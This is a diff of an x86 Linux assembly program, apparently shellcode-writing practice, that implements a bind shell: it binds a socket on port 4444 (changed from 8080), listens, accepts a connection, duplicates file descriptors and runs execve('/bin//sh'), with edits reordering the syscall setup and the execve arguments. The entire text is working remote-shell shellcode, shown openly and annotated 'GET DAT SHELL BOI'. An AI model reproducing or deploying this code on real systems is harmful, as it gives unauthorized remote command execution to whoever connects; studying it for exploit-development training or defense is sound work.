@@ -50,21 +50,21 @@ _start:
 	; 16)
 	;
 
+	mov al, 0x66		; socketcall() syscall #
+
 	inc ebx			; ebx was 0x1, now 0x2 it's for bind() syscall #
 
 	push edx		; INADDR_ANY (0.0.0.0)
-	push word 0x901f	; port = 8080 - network byte order
-	push bx			; AF_INET = 2
+	push word 0x5C11	; port = 4444
+	push word bx		; AF_INET = 2
 
 	mov ecx, esp		; save pointer in ecx -- points to struct
 
-	push byte 0x10		; sizeof
+	push 0x10		; sizeof
 	push ecx		; pointer
 	push esi		; sockfd / 0x3
 
 	mov ecx, esp		; save pointer in ecx -- points to bind() args
-
-	mov al, 0x66		; socketcall() syscall # 
 
 	int 0x80		; run bind()
 
@@ -72,7 +72,9 @@ _start:
 	; listen for connections
 	; listen(sockfd, 2)
 	;
-
+	
+	mov al, 0x66		; socketcall() syscall #
+	
 	push ebx		; queueLimit = 2 -- 0x2 from before
 	push esi		; sockfd / 0x3
 
@@ -80,9 +82,6 @@ _start:
 
 	inc ebx			; add 2 to ebx to equal 0x4 for listen() syscall #
 	inc ebx			; ebx = 0x4
-	
-	push 0x66		; changed this from mov al, 0x66 and it works
-	pop eax			; socketcall() syscall #
 
 	int 0x80		; run listen()
 
@@ -92,6 +91,8 @@ _start:
 	;
 
 	; edx is currently 0x0 so we can push that onto the stack for the NULL values
+	
+	mov al, 0x66	; socketcall() syscall #
 
 	push edx	; NULL
 	push edx	; NULL
@@ -100,8 +101,6 @@ _start:
 	mov ecx, esp	; save pointer in ecx -- points to accept() args
 
 	inc ebx 	; add 1 to ebx to make it 0x5 for the accept() syscall # 
-
-	mov al, 0x66	; socketcall() syscall #
 
 	int 0x80	; run accept()
 
@@ -127,13 +126,19 @@ duploop:
 	; execve("/bin//sh", NULL, NULL)  
 	;	
 
-	mov al, 0x0b		; execve() syscall #
-
-	push edx		; NULL 
+	xor eax, eax		; clear eax
+	push eax		; push 0x0
+	
 	push 0x68732f2f     	; hs//  - two slashes are added to make the total value 8 bytes
 	push 0x6e69622f     	; nib/  
-      
 	mov ebx, esp       	; EBX points to "/bin//sh"  
-	mov ecx, edx        	; ECX = NULL    
+	
+	push eax		; NULL
+	mov ecx, esp		; save pointer
+	
+	push eax		; NULL
+	mov edx, esp
+	
+	mov al, 0xb		; execve() syscall #   
 	
     	int 0x80		; run execve() GET DAT SHELL BOI
